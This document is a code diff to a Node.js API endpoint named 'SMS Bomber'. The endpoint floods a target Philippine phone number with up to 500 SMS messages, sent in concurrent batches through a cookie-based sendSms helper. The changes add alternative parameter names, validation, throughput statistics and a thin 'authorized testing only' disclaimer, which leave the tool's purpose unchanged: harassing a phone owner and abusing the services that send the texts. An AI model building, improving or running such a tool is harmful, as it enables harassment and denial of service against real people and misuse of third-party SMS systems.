@@ -5,7 +5,7 @@ module.exports = {
   meta: {
     name: "SMS Bomber",
     description: "Send bulk SMS to a target phone number for testing purposes",
-    author: "Jay Bohol",
+    author: "Kenneth Panio",
     version: "1.0.0",
     category: "tools",
     method: "GET",
@@ -14,51 +14,98 @@ module.exports = {
   
   onStart: async function({ req, res }) {
     try {
-      let { phone, times } = req.query;
-      times = parseInt(times, 10) || 100;
+      let { phone, times, number, count, amount } = req.query;
       
-      // Validate and format phone number
-      if (phone.startsWith("+63")) {
-        phone = phone.slice(3);
-      } else if (phone.startsWith("63")) {
-        phone = phone.slice(2);
-      } else if (phone.startsWith("0")) {
-        phone = phone.slice(1);
+      // Support multiple parameter names for phone number
+      let targetPhone = phone || number;
+      
+      // Support multiple parameter names for SMS count
+      let smsCount = times || count || amount;
+      smsCount = parseInt(smsCount, 10) || 100;
+      
+      // Validate phone number
+      if (!targetPhone) {
+        return res.status(400).json({
+          status: false,
+          error: "Phone number is required",
+          usage: {
+            example: "/smsbomber?phone=09276547755&times=10",
+            parameters: {
+              phone: "Philippine phone number (supports +63, 63, 09, or 9 formats)",
+              times: "Number of SMS to send (default: 100, max: 500)"
+            }
+          }
+        });
+      }
+      
+      // Format and validate phone number
+      let originalPhone = targetPhone;
+      let formattedPhone = targetPhone;
+      
+      if (formattedPhone.startsWith("+63")) {
+        formattedPhone = formattedPhone.slice(3);
+      } else if (formattedPhone.startsWith("63")) {
+        formattedPhone = formattedPhone.slice(2);
+      } else if (formattedPhone.startsWith("0")) {
+        formattedPhone = formattedPhone.slice(1);
       }
       
       // Check if phone number is valid (10 digits)
-      if (!phone || !/^\d{10}$/.test(phone)) {
+      if (!formattedPhone || !/^\d{10}$/.test(formattedPhone)) {
         return res.status(400).json({
           status: false,
-          error: "Invalid phone number. Please use PH number format: +63, 63, 09, or 9 followed by 10 digits"
+          error: "Invalid phone number format",
+          details: {
+            provided: originalPhone,
+            expected_formats: ["+6392776547755", "6392776547755", "092776547755", "92776547755"],
+            message: "Please use a valid Philippine phone number (10 digits after country code)"
+          }
         });
       }
       
-      // Rate limit check (optional)
-      if (times > 500) {
+      // Rate limit check
+      if (smsCount > 500) {
         return res.status(400).json({
           status: false,
-          error: "Maximum SMS limit is 500 per request"
+          error: "Maximum SMS limit exceeded",
+          details: {
+            requested: smsCount,
+            maximum: 500,
+            message: "Please request 500 or fewer SMS messages"
+          }
         });
       }
       
-      console.log(`📨 Starting SMS bombing to ${phone} (${times} times)...`);
+      if (smsCount < 1) {
+        return res.status(400).json({
+          status: false,
+          error: "Invalid SMS count",
+          details: {
+            requested: smsCount,
+            minimum: 1,
+            message: "Please request at least 1 SMS"
+          }
+        });
+      }
+      
+      console.log(`📨 Starting SMS bombing to ${formattedPhone} (${smsCount} times)...`);
       
       let successCount = 0;
       let failCount = 0;
       const errors = [];
+      const startTime = Date.now();
       
       // Send SMS in batches to avoid overwhelming the system
       const batchSize = 10;
-      const batches = Math.ceil(times / batchSize);
+      const batches = Math.ceil(smsCount / batchSize);
       
       for (let batch = 0; batch < batches; batch++) {
         const batchStart = batch * batchSize;
-        const batchEnd = Math.min(batchStart + batchSize, times);
+        const batchEnd = Math.min(batchStart + batchSize, smsCount);
         const batchPromises = [];
         
         for (let i = batchStart; i < batchEnd; i++) {
-          batchPromises.push(sendSingleSms(phone, i + 1));
+          batchPromises.push(sendSingleSms(formattedPhone, i + 1));
         }
         
         const results = await Promise.allSettled(batchPromises);
@@ -70,6 +117,8 @@ module.exports = {
             failCount++;
             if (result.reason) {
               errors.push(result.reason);
+            } else if (result.value?.error) {
+              errors.push(result.value.error);
             }
           }
         });
@@ -80,18 +129,34 @@ module.exports = {
         }
       }
       
+      const endTime = Date.now();
+      const duration = ((endTime - startTime) / 1000).toFixed(2);
+      
+      // Format phone number for display
+      const displayPhone = `+63${formattedPhone}`;
+      
       res.json({
         status: true,
-        message: `SMS bombing completed`,
-        target: phone,
-        requested: times,
-        details: {
-          success: successCount,
-          failed: failCount,
-          success_rate: `${((successCount / times) * 100).toFixed(2)}%`
+        message: "SMS bombing completed",
+        target: {
+          original: originalPhone,
+          formatted: displayPhone,
+          number: formattedPhone
         },
+        request: {
+          requested_count: smsCount,
+          successful: successCount,
+          failed: failCount,
+          success_rate: `${((successCount / smsCount) * 100).toFixed(2)}%`
+        },
+        performance: {
+          duration_seconds: parseFloat(duration),
+          sms_per_second: (smsCount / duration).toFixed(2)
+        },
+        errors: errors.length > 0 ? errors.slice(0, 10) : undefined,
         author: "Kenneth Panio",
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        disclaimer: "This tool is for authorized testing only. Unauthorized SMS bombing may be illegal."
       });
       
     } catch (error) {
@@ -101,7 +166,8 @@ module.exports = {
         status: false,
         error: "Failed to complete SMS bombing",
         details: error.message,
-        author: "Kenneth Panio"
+        author: "Kenneth Panio",
+        timestamp: new Date().toISOString()
       });
     }
   }
@@ -219,10 +285,10 @@ const sendSingleSms = async (phone, attemptNumber) => {
     
     const result = await sendSms(cookie, phone);
     if (result?.success) {
-      console.log(`✅ SMS ${attemptNumber} sent successfully.`);
+      console.log(`✅ SMS ${attemptNumber} sent successfully to ${phone}.`);
       return { success: true };
     } else {
-      console.log(`❌ SMS ${attemptNumber} failed.`);
+      console.log(`❌ SMS ${attemptNumber} failed to ${phone}.`);
       return { success: false, error: result?.message || "SMS send failed" };
     }
   } catch (error) {
